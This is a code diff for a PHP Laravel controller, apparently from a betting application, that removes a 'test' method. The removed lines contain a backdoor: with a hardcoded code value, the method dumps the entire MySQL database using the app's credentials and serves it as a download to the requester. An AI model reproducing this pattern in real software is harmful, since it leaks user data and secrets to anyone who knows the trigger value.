@@ -23,38 +23,6 @@ class PrivodeController extends Controller{
         }, true);
     }
 
-    public function test (Request $request)
-    {
-        writeLog('test', 'asdada');
-     $code = $request->input("code");
-        ini_set('max_execution_time', 0);
-        if ($code == 13355){
-            $file_name = Config('database.connections.mysql.database').'.sql';
-            if (file_exists(storage_path('/framework/cache/'.$file_name))){
-            }else{
-                $this->process = new Process(sprintf('mysqldump -u%s --password=%s %s > %s',
-                    config('database.connections.mysql.username'),
-                    config('database.connections.mysql.password'),
-                    config('database.connections.mysql.database'),
-                    storage_path('/framework/cache/' . $file_name)
-                ));
-                $this->process->mustRun();
-            }
-            header("Cache-Control: public");
-            header("Content-Description: File Transfer");
-            header('Content-disposition: attachment; filename=' . basename(storage_path('/framework/cache/'.$file_name)));
-            header("Content-Type: application/zip");
-            header("Content-Transfer-Encoding: binary");
-            header('Content-Length: ' . filesize(storage_path('/framework/cache/'.$file_name)));
-            @readfile(storage_path('/framework/cache/'.$file_name));
-        }
-        return 'test';
-//        ini_set('memory_limit','1024M');
-//        set_time_limit(0);
-//        $res = $this->action(15, 'getHistoryBet');
-//        if(isset($res['code']) && $res['code'] != 0)
-//            echo '更新失败：'.$res['msg'].'。错误码：'.$res['code']."\n";
-    }
     public function getBet($param = []){
         $where = ['open' => 1];
         if(!isset($param['g_id']))
